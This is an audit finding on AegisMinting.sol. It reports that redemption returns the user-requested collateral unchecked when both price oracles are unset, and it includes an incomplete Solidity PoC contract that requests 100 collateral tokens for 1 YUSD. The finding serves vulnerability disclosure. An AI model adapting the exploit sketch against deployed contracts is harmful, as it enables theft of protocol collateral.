# Excessive collateral payout when both price feeds are disabled

### Summary

If both the Chainlink USD feed and the AegisOracle are disabled or unset (i.e. their addresses are zero, or return a zero price), the function  
`_calculateRedeemMinCollateralAmount(...)` in AegisMinting.sol contract
skips both on-chain price checks and simply returns the user-supplied `order.collateralAmount`.  
As a result, during redemption the contract may hand over **up to** the full user-supplied collateral for burning just a fraction of YUSD - potentially far more than current market prices justify.

### Root Cause

In [`AegisMinting.sol:288`](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/main/aegis-contracts/contracts/AegisMinting.sol#L288) is calculated the minimum collateralAmount, but if Chainlink USD feed and AegisOracle are disabled it will return the whole amount of token as much the user wants.

### Internal Pre-conditions

1. address(_feedRegistry) = address(0)
2. address(aegisOracle) = address(0)
2. the user request to redeem some YUSD tokens
3. FUNDS_MANAGER_ROLE approve the redeem request
4. the user receive excessive collateral payout

### External Pre-conditions

1. attacker needs to hit the moment when Chainlink USD feed and the AegisOracle are disabled or unset

### Attack Path

1. Attacker knows that Chainlink USD feed and the AegisOracle are disabled or unset
2. Calls redeemRequest with buch amount of tokens
3. An admin with role FUNDS_MANAGER_ROLE mistakenly approves the request

### Impact

** Over-payout of collateral_**
   - Say,  a user wants to redeem a certain number YUSD tokens. In return, he receives as many tokens as the colateralAmount. 
   - With both feeds disabled -> both checks skipped -> contract overpays collateral
   - If the user’s “max acceptable collateral” is set above true market value, the contract overpays, draining excess collateral from its treasury.

   - Given sufficient collateral reserves in the contract, an attacker can withdraw arbitrarily large amounts of asset tokens in exchange for burning a fixed YUSD burn amount - effectively minting free tokens of that asset.

### PoC

`
  contract Exploit {
      AegisMinting minting;
      IERC20 yusd;
      IERC20 collateral;

    constructor(address _minting, address _yusd, address _collateral) {
        minting    = AegisMinting(_minting);
        yusd        = IERC20(_yusd);
        collateral  = IERC20(_collateral);
    }

    function runExploit() external {
        // 1) Ensure attacker has at least 1 YUSD
        yusd.approve(address(minting), type(uint256).max);

        // 2) Set OrderLib.Order with:
        //    .orderType = REDEEM
        //    .userWallet = attacker
        //    .collateralAsset = address(collateral)
        //    .collateralAmount = 100
        //    .yusdAmount = 1
        //    .slippageAdjustedAmount = 0
        OrderLib.Order memory order = OrderLib.Order({
            orderType: OrderLib.OrderType.REDEEM,
            userWallet: address(this),
            collateralAsset: address(collateral),
            collateralAmount: 100,
            yusdAmount: 1,
            slippageAdjustedAmount: 0,
            nonce: /* fresh nonce */,
            expiry: block.timestamp + 1 days,
            additionalData: abi.encode("my-request-1")
        });
        bytes memory sig = /* valid signature by trustedSigner */;
        
        // 3) Submit redeem request
        minting.requestRedeem(order, sig);

        // 4) As FUNDS_MANAGER_ROLE, call:
        //    minting.approveRedeemRequest("my-request-1", 100);
        //    -> attacker receives 100 collateral tokens for burning just 1 YUSD
    }
